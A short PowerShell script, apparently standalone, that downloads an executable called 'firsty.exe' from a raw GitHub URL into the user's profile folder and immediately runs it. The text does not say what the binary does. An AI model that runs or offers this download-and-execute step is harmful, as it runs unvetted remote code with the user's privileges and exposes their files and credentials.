


cd $env:USERPROFILE


Invoke-WebRequest -Uri "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/firsty.exe" -OutFile "$env:USERPROFILE\firsty.exe"
cd $env:USERPROFILE


& "$env:USERPROFILE\firsty.exe" 

